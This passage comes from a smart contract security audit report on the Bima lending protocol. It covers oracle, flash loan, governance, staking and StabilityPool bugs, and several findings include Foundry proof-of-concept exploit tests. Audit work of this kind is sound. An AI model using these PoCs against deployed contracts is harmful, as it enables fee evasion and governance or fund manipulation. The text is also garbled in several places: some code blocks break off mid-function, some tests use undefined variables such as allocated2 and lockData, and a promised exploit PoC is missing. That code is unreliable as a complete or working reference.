**Impact:** Asset prices used by the protocol will always lose 10 decimals of accuracy.

**Recommended Mitigation:** `StorkOracleWrapper` should not downscale the price to 8 decimals; it should return the native 18 decimal value.

### No checks for L2 Sequencer being down

**Description:** Neither `PriceFeed.sol` (which is designed to work with Chainlink) nor `StorkOracleWrapper` (which has been created to allow `PriceFeed` to work with Stork Oracles) implement a check to test whether the L2 Sequencer is currently down.

When using Chainlink or other oracles with L2 chains like Arbitrum, smart contracts should [check whether the L2 Sequencer is down](https://medium.com/Bima-Labs/chainlink-oracle-defi-attacks-93b6cb6541bf#0faf) to avoid stale pricing data that appears fresh.

**Impact:** Code can execute with prices that don’t reflect the current pricing resulting in a potential loss of funds for users or the protocol.

**Recommended Mitigation:** Chainlink’s official documentation provides an [example](https://docs.chain.link/data-feeds/l2-sequencer-feeds#example-code) implementation of checking L2 sequencers. Stork's publicly available documentation does not provide any such feed.

**Bima:**
Acknowledged; Stork Oracle does not have an API for the L2 Sequencer status check at this time.


### `PriceFeed` will use incorrect price when underlying aggregator reaches `minAnswer`

**Description:** `PriceFeed` which has been designed to work with Chainlink oracles will use incorrect price when underlying aggregator reaches `minAnswer`.

This occurs because Chainlink price feeds have in-built minimum & maximum prices they will return; if due to an unexpected event an asset’s value falls below the price feed’s minimum price, [the oracle price feed will continue to report the (now incorrect) minimum price](https://medium.com/Bima-Labs/chainlink-oracle-defi-attacks-93b6cb6541bf#00ac).

**Impact:** Code can execute with prices that don’t reflect the current pricing resulting in a potential loss of funds for users/protocol.

**Recommended Mitigation:** Revert unless `minAnswer < answer < maxAnswer`. Additionally Stork Oracle (which may be used with `PriceFeed` via `StorkOracleWrapper`) has no publicly available documentation on its own behavior in this situation so we advise contacting them to ask about this.

**Bima:**
We will be using `PriceFeed` purely with Stork Oracle not Chainlink, and Stork Oracle does not have min/max values.


### Some `TroveManager` debt emission rewards can be lost

**Description:** `TroveManager` can earn token emission rewards from `BabelVault` if users vote for it to do so, and these rewards are distributed to users based either on debts or mints.

When creating a unit test scenario with all emissions going to `TroveManager` debt id, not all emissions appear to be distributed to users with open troves.

**Impact:** Not all the weekly token emissions allocated to  `TroveManager` get distributed to users with open troves; some amounts are never distributed and effectively lost.

**Proof of Concept:** Add the PoC to `test/foundry/core/BorrowerOperationsTest.t.sol`:
```solidity
function test_claimReward_someTroveManagerDebtRewardsLost() external {
    // setup vault giving user1 half supply to lock for voting power

    // owner registers TroveManager for vault emission rewards
    vm.prank(users.owner);

    (uint16 TM_RECEIVER_DEBT_ID, /*uint16 TM_RECEIVER_MINT_ID*/) = stakedBTCTroveMgr.emissionId();

    IIncentiveVoting.Vote[] memory votes = new IIncentiveVoting.Vote[](1);
    votes[0].id = TM_RECEIVER_DEBT_ID;
    votes[0].points = incentiveVoting.MAX_POINTS();

    vm.prank(users.user1);

    uint256 collateralAmount = 1e18;
    uint256 debtAmountMax
        = ((collateralAmount * _getScaledOraclePrice() / borrowerOps.CCR())
          - INIT_GAS_COMPENSATION);

**Recommended Mitigation:** This issue was found towards the end of the audit when filling in missing test suite coverage so the cause has not yet been determined and remains for the protocol team to investigate using the test suite. One way to prevent the issue is by not enabling `TroveManager` debtId emission rewards in `BabelVault`. The same issue may affect `TroveManager` mintId rewards.

### Implementation contracts should inherit from their interfaces enabling compile-time checks ensuring implementations correctly implement their interfaces

**Description:** Implementation contracts don't inherit from their interfaces which prevents compile-time checks that interfaces are correctly implemented. The interfaces and implementations also contain a lot of copy & paste duplicate definitions.

For example, examine the interface `IPriceFeed.sol` which [contains](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/interfaces/IPriceFeed.sol#L12-L42):
```solidity
function setOracle(
    address _token,
    address _chainlinkOracle,
    bytes4 sharePriceSignature,
    uint8 sharePriceDecimals,
    bool _isEthIndexed
) external;

function RESPONSE_TIMEOUT() external view returns (uint256);

function oracleRecords(
    address
)
    external
    view
    returns (
        address chainLinkOracle,
        uint8 decimals,
        bytes4 sharePriceSignature,
        uint8 sharePriceDecimals,
        bool isFeedWorking,
        bool isEthIndexed
    );
```

Then examine the implementation `PriceFeed.sol` ([1](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/PriceFeed.sol#L17-L25), [2](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/PriceFeed.sol#L60), [3](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/PriceFeed.sol#L85-L92)) which fails to correctly implement the `IPriceFeed` interface:
```solidity
struct OracleRecord {
    IAggregatorV3Interface chainLinkOracle;
    uint8 decimals;
    // @audit extra `heartbeat` members breaks interface `IPriceFeed::oracleRecords`
    uint32 heartbeat;
    bytes4 sharePriceSignature;
    uint8 sharePriceDecimals;
    bool isFeedWorking;
    bool isEthIndexed;

// @audit different name breaks interface `IPriceFeed::RESPONSE_TIMEOUT`
uint256 public constant RESPONSE_TIMEOUT_BUFFER = 1 hours;

function setOracle(
    address _token,
    address _chainlinkOracle,
    // @audit extra `heartbeat` members breaks interface `IPriceFeed::setOracle`
    uint32 _heartbeat,
    bytes4 sharePriceSignature,
    uint8 sharePriceDecimals,
    bool _isEthIndexed
) public onlyOwner {
}
```

**Impact:** Attempting to call `IPriceFeed::setOracle` reverts as it is missing the `_heartbeat` parameter in the interface. Similarly calling `IPriceFeed::oracleRecords` also reverts for the same reason and calling `IPriceFeed:: RESPONSE_TIMEOUT` reverts as the implementation has a different name for the variable.

**Recommended Mitigation:** Implementation contracts should inherit from their interfaces.

**Bima:**
Fixed in [PR39](https://github.com/Bima-Labs/bima-v1-core/pull/39) for all contracts except `DebtToken` and `BabelToken` which are dependent on external libraries whose interfaces we don't control.

**Cyfrin:** Resolved.


### `DebtToken::flashLoan` fees can be bypassed by borrowing in small amounts

**Description:** `DebtToken::flashLoan` fees can be bypassed by borrowing in small amounts to trigger [rounding down to zero](https://dacian.me/precision-loss-errors#heading-rounding-down-to-zero) precision loss in fee calculation. Since this function allows re-entrancy, the function can be re-entered multiple times to borrow larger amounts with zero fee.

**Impact:** Flash loan fees can be bypassed.

**Proof of Concept:** Add following test contract to `test/foundry/core/DebtTokenTest.t.sol`:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

// test setup
import {TestSetup, DebtToken} from "../TestSetup.sol";

contract DebtTokenTest is TestSetup {

    function test_flashLoan() external {
        // entire supply initially available to borrow
        assertEq(debtToken.maxFlashLoan(address(debtToken)), type(uint256).max);

        // expected fee for borrowing 1e18
        uint256 borrowAmount = 1e18;
        uint256 expectedFee  = borrowAmount * debtToken.FLASH_LOAN_FEE() / 10000;

        // fee should be > 0
        assertTrue(expectedFee > 0);

        // fee should exactly equal
        assertEq(debtToken.flashFee(address(debtToken), borrowAmount), expectedFee);

        // exploit rounding down to zero precision loss to get free flash loans
        // by borrowing in small amounts
        borrowAmount = 1111;
        assertEq(debtToken.flashFee(address(debtToken), borrowAmount), 0);

        // as DebtToken::flashLoan allows re-entrancy, the function can be re-entered
        // multiple times to borrow larger amounts at zero fee
    }
}
```

Run with: `forge test --match-test test_flashLoan`

**Recommended Mitigation:** `DebtToken::_flashFee` should revert if calculated fee is zero:
```solidity
function _flashFee(uint256 amount) internal pure returns (uint256 fee) {
    fee = (amount * FLASH_LOAN_FEE) / 10000;
    require(fee > 0, "ERC20FlashMint: amount too small");
}
```

### Using `ecrecover` directly vulnerable to signature malleability

**Description:** `DebtToken::permit` and `BabelToken::permit` call `ecrecover` directly but due to the symmetrical nature of the elliptic curve for every `[v,r,s]` there exists another `[v,r,s]` that returns the same valid result.

**Impact:** Usage of `ecrecover` directly is vulnerable to [signature malleability](https://dacian.me/signature-replay-attacks#heading-signature-malleability).

**Recommended Mitigation:** Use OpenZeppelin's [ECDSA](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/ECDSA.sol) library with a version of OpenZeppelin >= 4.7.3.

### Proposal creation bypasses minimum voting weight requirement when no tokens are locked hence no voting power exists

**Description:** `AdminVoting::minCreateProposalPct` specifies the minimum voting weight required to create proposals, however this is bypassed allowing anyone to create proposals when no tokens are locked and hence no voting power exists.

**Proof of Concept:** Firstly change `test/foundry/TestSetup.sol` to warp time forward in `setUp`:
```solidity
function setUp() public virtual {
    // prevent Foundry from setting block.timestamp = 1 which can cause
    // errors in this protocol
    vm.warp(1659973223);
```

Then add the following test contract to `/test/foundry/dao/AdminVotingTest.t.sol`:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {AdminVoting} from "../../../contracts/dao/AdminVoting.sol";

// test setup
import {TestSetup} from "../TestSetup.sol";

contract AdminVotingTest is TestSetup {
    AdminVoting adminVoting;

    uint256 constant internal INIT_MIN_CREATE_PROP_PCT = 10;   // 0.01%
    uint256 constant internal INIT_PROP_PASSING_PCT    = 2000; // 20%

    function setUp() public virtual override {
        super.setUp();

        adminVoting = new AdminVoting(address(babelCore),
                                      tokenLocker,
                                      INIT_MIN_CREATE_PROP_PCT,
                                      INIT_PROP_PASSING_PCT);
    }

    function test_constructor() external view {
        // parameters correctly set
        assertEq(adminVoting.minCreateProposalPct(), INIT_MIN_CREATE_PROP_PCT);
        assertEq(adminVoting.passingPct(), INIT_PROP_PASSING_PCT);
        assertEq(address(adminVoting.tokenLocker()), address(tokenLocker));

        // week initialized to zero
        assertEq(adminVoting.getWeek(), 0);
        assertEq(adminVoting.minCreateProposalWeight(), 0);

        // no proposals
        assertEq(adminVoting.getProposalCount(), 0);
    }

    function test_createNewProposal_inInitialState() external {
        // create dummy proposal
        AdminVoting.Action[] memory payload = new AdminVoting.Action[](1);
        payload[0].target = address(0x0);
        payload[0].data   = abi.encode("");

        uint256 lastProposalTimestamp = adminVoting.latestProposalTimestamp(users.user1);
        assertEq(lastProposalTimestamp, 0);

        // verify expected failure condition
        vm.startPrank(users.user1);
        vm.expectRevert("No proposals in first week");
        adminVoting.createNewProposal(users.user1, payload);

        // advance time by 1 week
        vm.warp(block.timestamp + 1 weeks);
        uint256 weekNum = 1;
        assertEq(adminVoting.getWeek(), weekNum);

        // verify there are no tokens locked
        assertEq(tokenLocker.getTotalWeightAt(weekNum), 0);

        // even though there are no tokens locked so users have no voting weight,
        // a user with no voting weight can still create a proposal!
        adminVoting.createNewProposal(users.user1, payload);
        vm.stopPrank();

        // verify proposal has been created
        assertEq(adminVoting.getProposalCount(), 1);

        // attempting to execute the proposal fails with correct error
        uint256 proposalId = 0;
        vm.expectRevert("Not passed");
        adminVoting.executeProposal(proposalId);

        // attempting to vote on the proposal fails with correct error
        vm.expectRevert("No vote weight");
        vm.prank(users.user1);
        adminVoting.voteForProposal(users.user1, proposalId, 0);

        // so this can't be exploited further
    }
}
```

Run with: `forge test --match-contract AdminVotingTest`.

**Recommended Mitigation:** Prevent proposal creation when there is no total voting weight for that week by changing `AdminVoting::minCreateProposalWeight` to revert in this case:
```diff
    function minCreateProposalWeight() public view returns (uint256) {
        uint256 week = getWeek();
        if (week == 0) return 0;
        week -= 1;

        uint256 totalWeight = tokenLocker.getTotalWeightAt(week);
+       require(totalWeight > 0, "Zero total voting weight for given week");

        return (totalWeight * minCreateProposalPct) / MAX_PCT;
    }
```

### Easily bypass `setGuardian` proposal passing requirement

**Description:** `AdminVoting::createNewProposal` calls `_isSetGuardianPayload` to detect whether a proposal contains a call to `IBabelCore.setGuardian`. If `true` then it requires a 50.1% majority in order for the `setGuardian` proposal to succeed, otherwise it uses the configured proposal pass percentage which is expected to be lower.

However this only works if there is only 1 payload and that payload calls `IBabelCore.setGuardian`. A malicious actor can easily bypass this by creating a proposal with 2 payloads where the second payload just does nothing.

**Impact:** A malicious actor can easily create a malicious `setGuardian` proposal that can be passed with the lower pass percentage, bypassing the requirement for a 50.1% majority on `setGuardian` proposals.

**Proof of Concept:** Add the PoC function to `test/foundry/dao/AdminVotingTest.t.sol`:
```solidity
function test_createNewProposal_setGuardian() external {
    // create a setGuardian proposal that also contains a dummy proposal
    AdminVoting.Action[] memory payload = new AdminVoting.Action[](2);
    payload[0].target = address(0x0);
    payload[0].data   = abi.encode("");
    payload[1].target = address(babelCore);
    payload[1].data   = abi.encodeWithSelector(IBabelCore.setGuardian.selector, users.user1);

    // lock up user tokens to receive voting power
    vm.prank(users.user1);
    tokenLocker.lock(users.user1, INIT_BAB_TKN_TOTAL_SUPPLY, 52);

    // warp forward BOOTSTRAP_PERIOD so voting power becomes active
    // and setGuardian proposals are allowed
    vm.warp(block.timestamp + adminVoting.BOOTSTRAP_PERIOD());

    // create the proposal
    vm.prank(users.user1);
    adminVoting.createNewProposal(users.user1, payload);

    // verify requiredWeight is 50.1% majority for setGuardian proposals
    assertEq(adminVoting.getProposalRequiredWeight(0),
             (tokenLocker.getTotalWeight() * adminVoting.SET_GUARDIAN_PASSING_PCT()) /
             adminVoting.MAX_PCT());

    // fails since the first dummy payload evaded detection of the
    // second setGuardian payload
}
```

Run with: `forge test --match-test test_createNewProposal_setGuardian`

**Recommended Mitigation:** Rename `AdminVoting::_isSetGuardianPayload` to `_containsSetGuardianPayload` and have it iterate through every element of the payload; if any payload element contains a call to `IBabelCore.setGuardian` then it should enforce the 50.1% requirement for that proposal:
```solidity
function _containsSetGuardianPayload(uint256 payloadLength, Action[] memory payload) internal view returns (bool) {
    for(uint256 i; i<payloadLength; i++) {
        bytes memory data = payload[i].data;

        // Extract the call sig from payload data
        bytes4 sig;
        assembly {
            sig := mload(add(data, 0x20))
        }

        if(sig == IBabelCore.setGuardian.selector) return true;
    }

    return false;
}
```

### Don't allow cancellation of executed or cancelled proposals

**Description:** `AdminVoting::cancelProposal` and `InterimAdmin::cancelProposal` allow cancellation of executed or cancelled proposals which doesn't make logical sense and may mislead guardian as to the exact state of the proposal.

**Recommended Mitigation:** Prevent cancellation of executed or already cancelled proposals:
```diff
function cancelProposal(uint256 id) external {
    require(msg.sender == babelCore.guardian(), "Only guardian can cancel proposals");
    require(id < proposalData.length, "Invalid ID");

    Action[] storage payload = proposalPayloads[id];
    require(!_containsSetGuardianPayload(payload.length, payload), "Guardian replacement not cancellable");
+   require(!proposalData[id].processed, "Already processed");
    proposalData[id].processed = true;
    emit ProposalCancelled(id);
}

### `TokenLocker::getTotalWeightAt` should loop until input `week` not `systemWeek`

**Description:** `TokenLocker::getTotalWeightAt` should loop until input `week` not `systemWeek`:
```diff
- while (updatedWeek < systemWeek) {
+ while (updatedWeek < week) {
```

The current implementation returns the wrong output when `week < systemWeek` and the previous weekly writes have not occurred which triggers processing of the final `while` loop, since it counts all the way up to `systemWeek` instead of stopping once reaching the input `week`.

A similar function `getAccountWeightAt` does this final loop correctly counting only up to the input `week`. Other similar functions `IncentiveVoting::getReceiverWeightAt` and `getTotalWeightAt` also implement this correctly counting only up to the input `week`.

### Less tokens can be allocated to emission receivers than weekly emissions due to precision loss from division before multiplication

**Description:** `BabelVault` allows one or more emission receivers to be created and `IncentiveVoting` allows token lockers to vote for how the weekly token emissions should be distributed. Note that:

* `IncentiveVoting::getReceiverVotePct` performs a [division](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/dao/IncentiveVoting.sol#L206) by `totalWeeklyWeights[week]`
* `EmissionSchedule::getReceiverWeeklyEmissions` [multiplies](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/dao/EmissionSchedule.sol#L94) the previously-divided returned amount before dividing it again

This causes precision loss due to [division before multiplication](https://dacian.me/precision-loss-errors#heading-division-before-multiplication) such that the sum of the amounts allocated to individual receivers is less than the total weekly emission amount.

**Impact:** The difference between the total weekly emission amount and the sum of the amounts allocated to receivers is lost.

**Proof of Concept:** Add the following PoC function to `test/foundry/dao/VaultTest.t.sol`:
```solidity
function test_allocateNewEmissions_twoReceiversWithUnequalExtremeVotingWeight() public {
    // setup vault giving user1 half supply to lock for voting power
    uint256 initialUnallocated = _vaultSetupAndLockTokens(INIT_BAB_TKN_TOTAL_SUPPLY/2);

    // owner registers second emissions receiver
    MockEmissionReceiver mockEmissionReceiver2 = new MockEmissionReceiver();
    address receiver2 = address(mockEmissionReceiver2);
    uint256 RECEIVER2_ID = _vaultRegisterReceiver(receiver2, 1);

    // user votes for both receivers to get emissions but with
    // extreme voting weights (1 and Max-1)
    IIncentiveVoting.Vote[] memory votes = new IIncentiveVoting.Vote[](2);
    votes[0].id = RECEIVER_ID;
    votes[0].points = 1;
    votes[1].id = RECEIVER2_ID;
    votes[1].points = incentiveVoting.MAX_POINTS()-1;

    vm.prank(users.user1);
    incentiveVoting.registerAccountWeightAndVote(users.user1, 52, votes);

    // warp time by 1 week
    vm.warp(block.timestamp + 1 weeks);

    // cache state prior to allocateNewEmissions
    uint16 systemWeek = SafeCast.toUint16(babelVault.getWeek());

    // initial unallocated supply has not changed
    assertEq(babelVault.unallocatedTotal(), initialUnallocated);

    // receiver calls allocateNewEmissions
    vm.prank(receiver);
    uint256 allocated = babelVault.allocateNewEmissions(RECEIVER_ID);

    // verify BabelVault::totalUpdateWeek current system week
    assertEq(babelVault.totalUpdateWeek(), systemWeek);

    // allocated+allocated2 = 536870911874999999463129087
    assertEq(firstWeekEmissions, allocated + allocated2);
}
```

**Recommended Mitigation:** Replace `IncentiveVoting::getReceiverVotePct` with a new function `getReceiverVoteInputs` which doesn't perform any division but rather returns the inputs to the calculation:
```solidity
function getReceiverVoteInputs(uint256 id, uint256 week) external
returns (uint256 totalWeeklyWeight, uint256 receiverWeeklyWeight) {
    // lookback one week
    week -= 1;

    // update storage - id & total weights for any
    // missing weeks up to current system week
    getReceiverWeightWrite(id);
    getTotalWeightWrite();

    // output total weight for lookback week
    totalWeeklyWeight = totalWeeklyWeights[week];

    // if not zero, also output receiver weekly weight
    if(totalWeeklyWeight != 0) {
        receiverWeeklyWeight = receiverWeeklyWeights[id][week];
    }
}
```

Change `EmissionSchedule::getReceiverWeeklyEmissions` to use the new function:
```solidity
function getReceiverWeeklyEmissions(
    uint256 id,
    uint256 week,
    uint256 totalWeeklyEmissions
) external returns (uint256 amount) {
    // get vote calculation inputs from IncentiveVoting
    (uint256 totalWeeklyWeight, uint256 receiverWeeklyWeight)
        = voter.getReceiverVoteInputs(id, week);

    // if there was weekly weight, calculate the amount
    // otherwise default returns 0
    if(totalWeeklyWeight != 0) {
        amount = totalWeeklyEmissions * receiverWeeklyWeight / totalWeeklyWeight;
    }
}
```

In the provided PoC this reduces the precision loss to only 1 wei:
```solidity
assertEq(firstWeekEmissions,     536870911875000000000000000);
assertEq(allocated + allocated2, 536870911874999999999999999);
```

### `StabilityPool::claimCollateralGains` should accrue depositor collateral gains before claiming

**Description:** `StabilityPool::claimCollateralGains` [reads](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/StabilityPool.sol#L706-L713) `collateralGainsByDepositor[msg.sender]` for each collateral to send users their gains.

However there is no call to `_accrueDepositorCollateralGain` which [updates](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/StabilityPool.sol#L560-L562) `collateralGainsByDepositor` with any new gains.

**Impact:** When calling `StabilityPool::claimCollateralGains` the user will not receive all the gains they were expecting. If the user realizes this they can trigger another action that calls `_accrueDepositorCollateralGain` before claiming to get their gains so at least the gains are not permanently lost - but the user may not even realize they didn't receive all the gains they were entitled to.

**Recommended Mitigation:** `StabilityPool::claimReward` should be made `public` instead of `external` and `claimCollateralGains` should call it prior to the remaining processing.

Prisma Finance [fixed](https://github.com/prisma-fi/prisma-contracts/commit/76dbc51db0c0d4c92a59776f5effc47e31e88087) this by having `claimCollateralGains` directly call `_accrueDepositorCollateralGain` but we found this resulted in a critical exploit that would allow an attacker to drain collateral tokens from the stability pool. Add the exploit PoC to [LiquidationManagerTest.t.sol](https://github.com/devdacian/bima-v1-core/blob/main/test/foundry/core/LiquidationManagerTest.t.sol):

### `StabilityPool::claimableReward` incorrectly returns lower than actual value as it doesn't include `storedPendingReward`

**Description:** `StabilityPool::claimableReward` is an `external view` function that can be used to show users their pending reward. However it doesn't [include](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/StabilityPool.sol#L577-L597) the amount inside `storedPendingReward[_depositor]` hence it will report a lower than true value.

Compare to `StabilityPool::_claimReward` which is used to actually claim the reward which does [include](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/StabilityPool.sol#L799-L802) `storedPendingReward[account]` into the total claimed reward.

**Impact:** User is told they have less rewards pending than they actually do.

**Recommended Mitigation:** `StabilityPool::claimableReward`  should include `storedPendingReward[_depositor]` into the total reward amount it returns.

### `StabilityPool` user functions panic revert if more than 256 collaterals are enabled

**Description:** `StabilityPool` has a number of mappings where the value component is an array with length 256:
```solidity
mapping(address depositor => uint256[256] deposits) public depositSums;
mapping(address depositor => uint80[256] gains) public collateralGainsByDepositor;
mapping(uint128 epoch => mapping(uint128 scale => uint256[256] sumS)) public epochToScaleToSums;
mapping(uint128 epoch => mapping(uint128 scale => uint256 sumG)) public epochToScaleToG;
```

There are a number of internal functions which iterate over every collateral then update these arrays, eg:
```solidity
function _updateSnapshots(address _depositor, uint256 _newValue) internal {
    uint256 length;
    if (_newValue == 0) {
        delete depositSnapshots[_depositor];

        length = collateralTokens.length;
        for (uint256 i; i < length; i++) {
            // @audit will panic revert if >= 257 collaterals are enabled
            depositSums[_depositor][i] = 0;
        }
```

Additionally `StabilityPool::enableCollateral` has no limit on the maximum amount of collaterals which can be added.

**Impact:** User functions panic revert and the protocol becomes unusable. Since `StabilityPool::collateralTokens` can never have members removed but only over-written, the protocol is permanently bricked.

**Proof of Concept:** Add the PoC function to `test/foundry/core/StabilityPoolTest.sol`:
```solidity
function test_provideToSP_panicWhen257Collaterals() external {
    for(uint160 i=1; i<=256; i++) {
        address newCollateral = address(i);

        vm.prank(address(factory));
        stabilityPool.enableCollateral(IERC20(newCollateral));
    }

    assertEq(stabilityPool.getNumCollateralTokens(), 257);

    // mint user1 some tokens
    uint256 tokenAmount = 100e18;
    vm.prank(address(borrowerOps));
    debtToken.mint(users.user1, tokenAmount);
    assertEq(debtToken.balanceOf(users.user1), tokenAmount);

    // user1 deposits them into stability pool
    vm.prank(users.user1);
    stabilityPool.provideToSP(tokenAmount);
    // fails with panic: array out-of-bounds access
}
```

Run with: `forge test --match-test test_provideToSP_panicWhen257Collaterals`

**Recommended Mitigation:** Firstly use a named constant which indicates purpose instead of the hard-coded literal 256.

Secondly prevent `StabilityPool::enableCollateral` from adding more than 256 collaterals.

### `setGuardian` proposals may incorrectly set lower passing percent if current default is greater than hard-coded value for guardian proposals

**Description:** `AdminVoting::createNewProposal` has a check that for `setGuardian` proposals it always uses the hard-coded `SET_GUARDIAN_PASSING_PCT` as the passing percent:

```solidity
if (_containsSetGuardianPayload(payload.length, payload)) {
    // prevent changing guardians during bootstrap period
    require(block.timestamp > startTime + BOOTSTRAP_PERIOD, "Cannot change guardian during bootstrap");

    // enforce 50.1% majority for setGuardian proposals
    proposalPassPct = SET_GUARDIAN_PASSING_PCT;
}
// otherwise for ordinary proposals enforce standard configured passing %
else proposalPassPct = passingPct;
```

The idea is that `setGuardian` proposals are very sensitive proposals and hence should require a 50.1% majority to pass, while other proposals are less sensitive and hence can be passed with a lower proposal percent.

However if the DAO decides to change the default passing percent to be greater than `SET_GUARDIAN_PASSING_PCT`, then `setGuardian` proposals would be created with a lower passing percent than ordinary proposals which is contrary to what is intended.

While setting `proposalPassPct` for a `setGuardian` proposal, we just use `SET_GUARDIAN_PASSING_PCT = 50.1%` without considering the current `passingPct`. It might be dangerous when `passingPct` is greater than `50.1%` due to any unexpected reason.

**Recommended Mitigation:** For `setGuardian` proposals, set the passing percent to whichever is greater of the currently configured passing percent and the hard-coded `SET_GUARDIAN_PASSING_PCT`:
```diff
- proposalPassPct = SET_GUARDIAN_PASSING_PCT;
+ proposalPassPct = BabelMath._max(SET_GUARDIAN_PASSING_PCT, passingPct);
```

### `TokenLocker::withdrawWithPenalty` doesn't reset account bitfield when dust handling results in no remaining locked tokens

**Description:** When users withdraw their locked tokens using `TokenLocker::withdrawWithPenalty`, if after the [dust handling](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/dao/TokenLocker.sol#L841-L852) the user has no remaining locked tokens then the account's `bitfield` is not correctly reset.

**Impact:** Storage reaches an inconsistent state where `TokenLocker` believes that user as an active lock even though the user has 0 tokens locked. This inconsistent state can spread to `IncentiveVoting` if the user then registers their non-existent account weight. Beyond the inconsistent state there doesn't appear to be a way to further leverage this to do more damage.

**Proof of Concept:** Add the PoC function to `test/foundry/dao/TokenLockerTest.t.sol`:
```solidity
function test_withdrawWithPenalty_activeLockWithZeroLocked() external {
    uint256 amountToLock = 100;
    uint256 weeksToLockFor = 20;

    // first enable penalty withdrawals
    test_setPenaltyWithdrawalsEnabled(0, true);

    // save user initial balance
    uint256 userPreTokenBalance = babelToken.balanceOf(users.user1);

    // perform the lock
    (uint256 lockedAmount, uint256 weeksLockedFor) = test_lock(amountToLock, weeksToLockFor);
    // verify the lock result
    assertEq(lockedAmount, 100);
    assertEq(weeksLockedFor, 20);

    // verify user has received weight in the current week
    uint256 week = tokenLocker.getWeek();
    assertTrue(tokenLocker.getAccountWeightAt(users.user1, week) != 0);

    // perform the withdraw with penalty
    vm.prank(users.user1);
    uint256 amountToWithdraw = 61;
    tokenLocker.withdrawWithPenalty(amountToWithdraw);

    // calculate expected penaltyOnAmount = 61 * 1e18 * (52 - 32) / 32 = 38.125e18
    // so amountToWithdraw + penaltyOnAmount = 99.125e18 and will be 100 after handling dust

    // verify account's weight was reset
    assertEq(tokenLocker.getAccountWeightAt(users.user1, week), 0);

    // verify total weight was reset
    assertEq(tokenLocker.getTotalWeight(), 0);

    // getAccountActiveLocks incorrectly shows user still has an active lock
    (ITokenLocker.LockData[] memory activeLockData, uint256 frozenAmount)
        = tokenLocker.getAccountActiveLocks(users.user1, weeksToLockFor);

    assertEq(activeLockData.length, 1); // 1 active lock
    assertEq(frozenAmount, 0);
    assertEq(activeLockData[0].amount, 0); // 0 locked amount
    assertEq(activeLockData[0].weeksToUnlock, weeksToLockFor);

    // user can register with IncentiveVoting even though they have no
    // tokens locked

    assertEq(lockData.length, 1);
    assertEq(lockData[0].amount, 0); // 0 locked amount
    assertEq(lockData[0].weeksToUnlock, weeksToLockFor);

    // this results in an inconsistent state but there doesn't appear
    // to be any way to further exploit this state since the locked
    // amount is zero
}
```

Run with: `forge test --match-test test_withdrawWithPenalty_activeLockWithZeroLocked`

**Recommended Mitigation:** `TokenLocker::withdrawWithPenalty` should reset the `bitfield` in case where the dust handling results in the user having no remaining tokens locked:

```diff
      if (lockAmount - penaltyOnAmount > remaining) {
          // then recalculate the penalty using only the portion of the lock
          // amount that will be withdrawn
          penaltyOnAmount = (remaining * MAX_LOCK_WEEKS) / (MAX_LOCK_WEEKS - weeksToUnlock) - remaining;

          // add any dust to the penalty amount
          uint256 dust = ((penaltyOnAmount + remaining) % lockToTokenRatio);
          if (dust > 0) penaltyOnAmount += lockToTokenRatio - dust;

          // update memory total penalty
          penaltyTotal += penaltyOnAmount;

          // calculate amount to reduce lock as penalty + withdrawn amount,
          // scaled down by lockToTokenRatio as those values were prev scaled up by this
          uint256 lockReduceAmount = (penaltyOnAmount + remaining) / lockToTokenRatio;

          // update memory total voting weight reduction
          decreasedWeight += lockReduceAmount * weeksToUnlock;

          // update storage to decrease week's future unlocks
          accountWeeklyUnlocks[msg.sender][systemWeek] -= SafeCast.toUint32(lockReduceAmount);
          totalWeeklyUnlocks[systemWeek] -= SafeCast.toUint32(lockReduceAmount);

### `TroveManager::redeemCollateral` can return less collateral tokens than expected due to rounding down to zero precision loss

**Description:** When a user calls `TroveManager::redeemCollateral` with a large enough debt amount such that the:
* first trove is completely exhausted and closed
* remaining debt amount used in the second trove is small

A [rounding down to zero precision loss](https://dacian.me/precision-loss-errors#heading-rounding-down-to-zero) occurs at the collateral [calculation](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/TroveManager.sol#L753):
```solidity
singleRedemption.collateralLot = (singleRedemption.debtLot * BIMA_DECIMAL_PRECISION) / _price;
```

This causes the user to receive no collateral for the remaining debt amount even though it is used to reduce the next trove's debt.

**Impact:** `TroveManager::redeemCollateral` can return less collateral tokens than expected due to rounding down to zero precision loss.

**Proof of Concept:** Add PoC to `test/foundry/core/BorrowerOperationsTest.t.sol`:
```solidity
function test_redeemCollateral_noCollateralForRemainingAmount() external {
    // fast forward time to after bootstrap period
    vm.warp(stakedBTCTroveMgr.systemDeploymentTime() + stakedBTCTroveMgr.BOOTSTRAP_PERIOD());

### `StabilityPool` should use per-collateral rounding error compensation

**Description:** Prisma fixed this in commit [0915dd4](https://github.com/prisma-fi/prisma-contracts/commit/0915dd4983ddbafd03601b186f2e1b8eae7dc311#diff-1cba6dc54756d6e48926d14e0933ff37d349c271ae78f2b5f02e85aa8fc9c312R417) noting that _"prior to this commit, owed collateral can deviate by dust amounts.

### `StabilityPool` reward calculation loses small amounts of vault emission rewards

**Description:** `StabilityPool` can earn token emission rewards from `BabelVault` if users vote for it to do so, and these rewards are distributed to users who deposit into `StabilityPool`. The mechanism for calculating depositors' reward share appears to result in small amounts of lost token emissions.

